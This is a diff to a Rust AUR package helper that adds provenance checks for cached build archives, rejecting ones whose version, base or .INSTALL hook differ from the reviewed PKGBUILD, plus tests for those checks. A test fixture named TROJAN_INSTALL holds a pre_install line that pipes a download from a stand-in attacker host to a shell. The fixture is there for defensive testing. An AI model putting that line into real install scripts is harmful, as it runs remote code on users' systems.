@@ -197,6 +197,15 @@ struct MakepkgEnv {
     extra_env: Vec<(String, String)>,
 }
 
+/// Identity and .INSTALL payload extracted from one package archive
+/// (SEC-R2-01 cached-artifact provenance verification).
+struct CachedArchiveIdentity {
+    name: String,
+    version: String,
+    base: String,
+    install_script: Option<String>,
+}
+
 #[derive(Clone, Copy)]
 enum BuildOutputStream {
     Stdout,
@@ -1457,10 +1466,15 @@ impl AurClient {
         let mut pkg_files: Vec<PathBuf> = match cached {
             Some(archives)
                 if archives.len() == requested_outputs.len()
-                    && archives
-                        .iter()
-                        .zip(requested_outputs)
-                        .all(|(archive, output)| Self::cached_archive_matches(archive, output)) =>
+                    && archives.iter().zip(requested_outputs).all(|(archive, output)| {
+                        Self::cached_archive_matches(archive, output)
+                            && Self::cached_artifact_provenance_ok(
+                                archive,
+                                &pkg_dir,
+                                package,
+                                output,
+                            )
+                    }) =>
             {
                 crate::cli::modern_ui::print_info(&format!("Using cached build for {package}"));
                 archives
@@ -1650,7 +1664,9 @@ impl AurClient {
                 &cache_key,
             )
             .await?
-            .and_then(|archives| Self::select_cached_artifact(archives, package))
+            .and_then(|archives| {
+                Self::select_cached_artifact(archives, package, &pkg_dir, package_base)
+            })
         {
             return Ok(cached);
         }
@@ -1817,18 +1833,263 @@ impl AurClient {
     }
 
     /// Verify a cached archive's embedded .PKGINFO names the requested
-    /// package. Defense against cross-package cache substitution (audit
-    /// SEC02-02): the key file lives in the same user-writable tree as
-    /// attacker-executing builds, so the artifact itself must carry the
-    /// identity before it is trusted for install.
-    fn select_cached_artifact(archives: Vec<PathBuf>, package: &str) -> Option<PathBuf> {
+    /// package AND that the archive carries provenance from the exact
+    /// reviewed PKGBUILD. Defense against cross-package cache substitution
+    /// (audit SEC02-02) and full cache poisoning (SEC-R2-01): the cache key
+    /// and the archive both live in the attacker-writable cache tree, so a
+    /// matching pkgname alone proves nothing — the artifact must also match
+    /// the fetched .SRCINFO version/base and embed the exact .INSTALL hook
+    /// the reviewed PKGBUILD declares. Any missing proof falls through to a
+    /// fresh, reviewed rebuild.
+    fn select_cached_artifact(
+        archives: Vec<PathBuf>,
+        package: &str,
+        pkg_dir: &Path,
+        package_base: &str,
+    ) -> Option<PathBuf> {
         let mut archives = archives.into_iter();
         let archive = archives.next()?;
-        if archives.next().is_some() || !Self::cached_archive_matches(&archive, package) {
-            tracing::warn!("Rejecting cached build for {package}: archive identity did not match");
+        if archives.next().is_some()
+            || !Self::cached_archive_matches(&archive, package)
+            || !Self::cached_artifact_provenance_ok(&archive, pkg_dir, package_base, package)
+        {
+            tracing::warn!(
+                "Rejecting cached build for {package}: archive identity or provenance did not match"
+            );
             return None;
         }
         Some(archive)
+    }
+
+    /// Provenance proof for one cached archive (SEC-R2-01): a cached
+    /// artifact may only be installed when it was demonstrably produced by
+    /// the exact reviewed PKGBUILD. The archive's embedded .PKGINFO must
+    /// match the fetched .SRCINFO (pkgname, pkgbase, pkgver-pkgrel) and its
+    /// embedded .INSTALL hook must be byte-identical to the install script
+    /// the reviewed PKGBUILD declares via `install=` (or absent when no
+    /// install script is declared). Every missing or mismatched proof fails
+    /// closed so the caller falls through to a fresh, reviewed rebuild — a
+    /// poisoned cache is never silently trusted.
+    fn cached_artifact_provenance_ok(
+        archive: &Path,
+        pkg_dir: &Path,
+        package_base: &str,
+        output: &str,
+    ) -> bool {
+        let srcinfo = match std::fs::read_to_string(pkg_dir.join(".SRCINFO")) {
+            Ok(srcinfo) => srcinfo,
+            Err(error) => {
+                tracing::warn!(
+                    "Cached artifact provenance for {output}: unreadable .SRCINFO in {}: {error}; rejecting cache hit",
+                    pkg_dir.display()
+                );
+                return false;
+            }
+        };
+        let Some(expected_version) = Self::srcinfo_version(&srcinfo) else {
+            tracing::warn!(
+                "Cached artifact provenance for {output}: .SRCINFO has no usable version; rejecting cache hit"
+            );
+            return false;
+        };
+        let Some(expected_base) = Self::srcinfo_pkgbase(&srcinfo) else {
+            tracing::warn!(
+                "Cached artifact provenance for {output}: .SRCINFO declares no pkgbase; rejecting cache hit"
+            );
+            return false;
+        };
+        if expected_base != package_base {
+            tracing::warn!(
+                "Cached artifact provenance for {output}: .SRCINFO pkgbase '{expected_base}' does not match package base '{package_base}'; rejecting cache hit"
+            );
+            return false;
+        }
+
+        let Some(identity) = (match Self::cached_archive_identity(archive) {
+            Ok(identity) => identity,
+            Err(error) => {
+                tracing::warn!(
+                    "Cached artifact provenance for {output}: cannot read metadata from {}: {error}; rejecting cache hit",
+                    archive.display()
+                );
+                return false;
+            }
+        }) else {
+            tracing::warn!(
+                "Cached artifact provenance for {output}: {} has no readable .PKGINFO; rejecting cache hit",
+                archive.display()
+            );
+            return false;
+        };
+
+        if identity.name != output
+            || identity.version != expected_version
+            || identity.base != package_base
+        {
+            tracing::warn!(
+                "Cached artifact provenance for {output}: {} claims '{}' '{}' in base '{}', expected '{}' in base '{package_base}' from .SRCINFO; rejecting cache hit",
+                archive.display(),
+                identity.name,
+                identity.version,
+                identity.base,
+                expected_version
+            );
+            return false;
+        }
+
+        match Self::srcinfo_install_script(&srcinfo, output) {
+            Some(install_file) => {
+                let Some(embedded) = identity.install_script.as_deref() else {
+                    tracing::warn!(
+                        "Cached artifact provenance for {output}: reviewed PKGBUILD declares install script '{install_file}' but {} embeds no .INSTALL; rejecting cache hit",
+                        archive.display()
+                    );
+                    return false;
+                };
+                let expected = match std::fs::read_to_string(pkg_dir.join(&install_file)) {
+                    Ok(expected) => expected,
+                    Err(error) => {
+                        tracing::warn!(
+                            "Cached artifact provenance for {output}: cannot read declared install script {install_file}: {error}; rejecting cache hit"
+                        );
+                        return false;
+                    }
+                };
+                if embedded.trim_end() != expected.trim_end() {
+                    tracing::warn!(
+                        "Cached artifact provenance for {output}: .INSTALL hook in {} does not match the reviewed install script '{install_file}'; rejecting cache hit",
+                        archive.display()
+                    );
+                    return false;
+                }
+            }
+            None if identity.install_script.is_some() => {
+                tracing::warn!(
+                    "Cached artifact provenance for {output}: reviewed PKGBUILD declares no install script but {} embeds a .INSTALL hook; rejecting cache hit",
+                    archive.display()
+                );
+                return false;
+            }
+            None => {}
+        }
+
+        true
+    }
+
+    /// Read `.PKGINFO` (and `.INSTALL` when present) from a package archive
+    /// in a single bounded pass. Returns `Ok(None)` when the archive carries
+    /// no `.PKGINFO` member at all.
+    fn cached_archive_identity(archive: &Path) -> Result<Option<CachedArchiveIdentity>> {
+        let reader = Self::package_archive_reader(archive, MAX_DECOMPRESSED_BYTES)?;
+        let mut tar_archive = tar::Archive::new(reader);
+        let mut pkginfo: Option<String> = None;
+        let mut install_script: Option<String> = None;
+        for entry in tar_archive.entries()? {
+            let entry = entry?;
+            let entry_path = entry.path()?;
+            if entry_path.components().count() > 2 {
+                continue;
+            }
+            match entry_path.file_name().and_then(|name| name.to_str()) {
+                Some(".PKGINFO" | "PKGINFO") if pkginfo.is_none() => {
+                    pkginfo = Some(Self::read_bounded_archive_member(entry)?);
+                }
+                Some(".INSTALL") if install_script.is_none() => {
+                    install_script = Some(Self::read_bounded_archive_member(entry)?);
+                }
+                _ => {}
+            }
+        }
+        let Some(pkginfo) = pkginfo else {
+            return Ok(None);
+        };
+        Ok(Self::parse_pkginfo_identity(&pkginfo).map(|(name, version, base)| {
+            CachedArchiveIdentity {
+                name,
+                version,
+                base,
+                install_script,
+            }
+        }))
+    }
+
+    /// Read one archive member with the same size cap as `.PKGINFO` reads.
+    fn read_bounded_archive_member<R: std::io::Read>(
+        entry: tar::Entry<R>,
+    ) -> Result<String> {
+        if entry.size() > MAX_PKGINFO_BYTES {
+            anyhow::bail!(
+                "Package metadata member exceeds the {MAX_PKGINFO_BYTES} byte limit"
+            );
+        }
+        let mut content = String::with_capacity(entry.size() as usize);
+        entry
+            .take(MAX_PKGINFO_BYTES + 1)
+            .read_to_string(&mut content)?;
+        if content.len() as u64 > MAX_PKGINFO_BYTES {
+            anyhow::bail!(
+                "Package metadata member exceeds the {MAX_PKGINFO_BYTES} byte limit"
+            );
+        }
+        Ok(content)
+    }
+
+    /// Extract `(pkgname, full-version, pkgbase)` from `.PKGINFO` content.
+    /// `pkgbase` is mandatory for provenance: makepkg always emits it, so an
+    /// archive without one is not a makepkg product and must not be trusted.
+    fn parse_pkginfo_identity(content: &str) -> Option<(String, String, String)> {
+        let mut name: Option<String> = None;
+        let mut version: Option<String> = None;
+        let mut base: Option<String> = None;
+        for line in content.lines() {
+            let Some((key, value)) = line.split_once('=') else {
+                continue;
+            };
+            match key.trim() {
+                "pkgname" if name.is_none() => name = Some(value.trim().to_string()),
+                "pkgver" if version.is_none() => version = Some(value.trim().to_string()),
+                "pkgbase" if base.is_none() => base = Some(value.trim().to_string()),
+                _ => {}
+            }
+        }
+        Some((name?, version?, base?))
+    }
+
+    /// Extract the `pkgbase` value from `.SRCINFO` text (first occurrence).
+    fn srcinfo_pkgbase(content: &str) -> Option<&str> {
+        content.lines().find_map(|line| {
+            let (key, value) = line.split_once('=')?;
+            let value = value.trim();
+            (key.trim() == "pkgbase" && !value.is_empty()).then_some(value)
+        })
+    }
+
+    /// Extract the install script declared for one split-package output in
+    /// `.SRCINFO` text. The `install =` key appears inside the block of the
+    /// `pkgname =` it belongs to; returns `None` when that output declares
+    /// no install script.
+    fn srcinfo_install_script(content: &str, pkgname: &str) -> Option<String> {
+        let mut current_block_is_target = false;
+        let mut install: Option<String> = None;
+        for line in content.lines() {
+            let Some((key, value)) = line.split_once('=') else {
+                continue;
+            };
+            let value = value.trim();
+            match key.trim() {
+                "pkgname" => {
+                    if install.is_some() {
+                        break; // Found in the target block; later blocks are sibling outputs.
+                    }
+                    current_block_is_target = value == pkgname;
+                }
+                "install" if current_block_is_target && install.is_none() && !value.is_empty() => {
+                    install = Some(value.to_string());
+                }
+                _ => {}
+            }
+        }
+        install
     }
 
     fn cached_archive_matches(archive: &Path, package: &str) -> bool {
@@ -3412,6 +3673,13 @@ mod tests {
     #[test]
     fn build_only_rejects_cached_archives_with_mismatched_identity() {
         let directory = tempfile::tempdir().unwrap();
+        let pkg_dir = directory.path().join("pkg");
+        std::fs::create_dir(&pkg_dir).unwrap();
+        std::fs::write(
+            pkg_dir.join(".SRCINFO"),
+            "pkgbase = requested\npkgver = 1.0\npkgrel = 1\n\npkgname = requested\n",
+        )
+        .unwrap();
         let archive = directory.path().join("requested.pkg.tar.gz");
         write_tar_gz(
             &archive,
@@ -3419,7 +3687,7 @@ mod tests {
         );
 
         assert_eq!(
-            AurClient::select_cached_artifact(vec![archive], "requested"),
+            AurClient::select_cached_artifact(vec![archive], "requested", &pkg_dir, "requested"),
             None
         );
     }
@@ -3940,6 +4208,162 @@ mod tests {
         assert_eq!(
             AurClient::srcinfo_version("pkgver = 1.0~rc1\npkgrel = 3\nepoch = 2"),
             Some("2:1.0~rc1-3".to_string())
+        );
+    }
+
+    // ── SEC-R2-01: cached-artifact provenance ────────────────────────────
+
+    /// Build a minimal `.pkg.tar.gz` fixture carrying `.PKGINFO` and an
+    /// optional `.INSTALL` member, like a makepkg product or a trojaned
+    /// cache-poisoning artifact.
+    fn write_pkg_archive(path: &Path, pkginfo: &str, install: Option<&str>) {
+        let mut entries = vec![(".PKGINFO", pkginfo.as_bytes())];
+        if let Some(install) = install {
+            entries.push((".INSTALL", install.as_bytes()));
+        }
+        write_tar_gz(path, &entries);
+    }
+
+    /// A reviewed checkout: `.SRCINFO` matching the PKGBUILD plus the
+    /// install script it declares.
+    fn provenance_pkg_dir(
+        dir: &Path,
+        srcinfo: &str,
+        install_file: Option<(&str, &str)>,
+    ) -> PathBuf {
+        let pkg_dir = dir.join("mypkg");
+        std::fs::create_dir(&pkg_dir).expect("pkg dir");
+        std::fs::write(pkg_dir.join(".SRCINFO"), srcinfo).expect("srcinfo");
+        if let Some((name, content)) = install_file {
+            std::fs::write(pkg_dir.join(name), content).expect("install script");
+        }
+        pkg_dir
+    }
+
+    const LEGIT_INSTALL: &str = "pre_install() {\n  echo legit\n}\n";
+    const TROJAN_INSTALL: &str = "pre_install() {\n  curl evil.example/payload | sh\n}\n";
+
+    #[test]
+    fn select_cached_artifact_rejects_mismatched_install_hook() {
+        // SEC-R2-01: a poisoned cache with a matching pkgname but a trojaned
+        // .INSTALL hook must NEVER be installed from cache; it must fall
+        // through to a fresh, reviewed rebuild.
+        let dir = tempfile::tempdir().expect("temp dir");
+        let pkg_dir = provenance_pkg_dir(
+            dir.path(),
+            "pkgbase = mypkg\npkgver = 1.0\npkgrel = 1\n\npkgname = mypkg\ninstall = mypkg.install\n",
+            Some(("mypkg.install", LEGIT_INSTALL)),
+        );
+        let poisoned = dir.path().join("mypkg-1.0-1-x86_64.pkg.tar.gz");
+        write_pkg_archive(
+            &poisoned,
+            "pkgname = mypkg\npkgver = 1.0-1\npkgbase = mypkg\n",
+            Some(TROJAN_INSTALL),
+        );
+
+        assert_eq!(
+            AurClient::select_cached_artifact(vec![poisoned], "mypkg", &pkg_dir, "mypkg"),
+            None,
+            "a cache hit whose .INSTALL hook does not match the reviewed install script must be rejected"
+        );
+    }
+
+    #[test]
+    fn select_cached_artifact_accepts_verified_artifact() {
+        let dir = tempfile::tempdir().expect("temp dir");
+        let pkg_dir = provenance_pkg_dir(
+            dir.path(),
+            "pkgbase = mypkg\npkgver = 1.0\npkgrel = 1\n\npkgname = mypkg\ninstall = mypkg.install\n",
+            Some(("mypkg.install", LEGIT_INSTALL)),
+        );
+        let genuine = dir.path().join("mypkg-1.0-1-x86_64.pkg.tar.gz");
+        write_pkg_archive(
+            &genuine,
+            "pkgname = mypkg\npkgver = 1.0-1\npkgbase = mypkg\n",
+            Some(LEGIT_INSTALL),
+        );
+
+        assert_eq!(
+            AurClient::select_cached_artifact(vec![genuine.clone()], "mypkg", &pkg_dir, "mypkg"),
+            Some(genuine),
+            "a cache hit whose .PKGINFO and .INSTALL match the reviewed source must be usable"
+        );
+    }
+
+    #[test]
+    fn select_cached_artifact_rejects_undeclared_install_hook() {
+        // No `install=` in the reviewed source: any embedded .INSTALL in the
+        // cached artifact is attacker-supplied.
+        let dir = tempfile::tempdir().expect("temp dir");
+        let pkg_dir = provenance_pkg_dir(
+            dir.path(),
+            "pkgbase = mypkg\npkgver = 1.0\npkgrel = 1\n\npkgname = mypkg\n",
+            None,
+        );
+        let poisoned = dir.path().join("mypkg-1.0-1-x86_64.pkg.tar.gz");
+        write_pkg_archive(
+            &poisoned,
+            "pkgname = mypkg\npkgver = 1.0-1\npkgbase = mypkg\n",
+            Some(TROJAN_INSTALL),
+        );
+
+        assert_eq!(
+            AurClient::select_cached_artifact(vec![poisoned], "mypkg", &pkg_dir, "mypkg"),
+            None,
+            "an undeclared .INSTALL hook in a cached artifact must be rejected"
+        );
+    }
+
+    #[test]
+    fn select_cached_artifact_rejects_pkginfo_identity_mismatch() {
+        let dir = tempfile::tempdir().expect("temp dir");
+        let pkg_dir = provenance_pkg_dir(
+            dir.path(),
+            "pkgbase = mypkg\npkgver = 1.0\npkgrel = 1\n\npkgname = mypkg\n",
+            None,
+        );
+        let wrong_version = dir.path().join("mypkg-9.9-1-x86_64.pkg.tar.gz");
+        write_pkg_archive(
+            &wrong_version,
+            "pkgname = mypkg\npkgver = 9.9-1\npkgbase = mypkg\n",
+            None,
+        );
+        let wrong_base = dir.path().join("evil-1.0-1-x86_64.pkg.tar.gz");
+        write_pkg_archive(
+            &wrong_base,
+            "pkgname = mypkg\npkgver = 1.0-1\npkgbase = evil\n",
+            None,
+        );
+
+        assert_eq!(
+            AurClient::select_cached_artifact(vec![wrong_version], "mypkg", &pkg_dir, "mypkg"),
+            None,
+            "a cache hit whose .PKGINFO version differs from the reviewed .SRCINFO must be rejected"
+        );
+        assert_eq!(
+            AurClient::select_cached_artifact(vec![wrong_base], "mypkg", &pkg_dir, "mypkg"),
+            None,
+            "a cache hit whose .PKGINFO pkgbase differs from the reviewed package base must be rejected"
+        );
+    }
+
+    #[test]
+    fn select_cached_artifact_fails_closed_without_srcinfo() {
+        // Missing .SRCINFO means missing proof of provenance: fail closed.
+        let dir = tempfile::tempdir().expect("temp dir");
+        let pkg_dir = dir.path().join("mypkg");
+        std::fs::create_dir(&pkg_dir).expect("pkg dir");
+        let archive = dir.path().join("mypkg-1.0-1-x86_64.pkg.tar.gz");
+        write_pkg_archive(
+            &archive,
+            "pkgname = mypkg\npkgver = 1.0-1\npkgbase = mypkg\n",
+            None,
+        );
+
+        assert_eq!(
+            AurClient::select_cached_artifact(vec![archive], "mypkg", &pkg_dir, "mypkg"),
+            None,
+            "provenance cannot be proven without .SRCINFO; must fail closed"
         );
     }
 
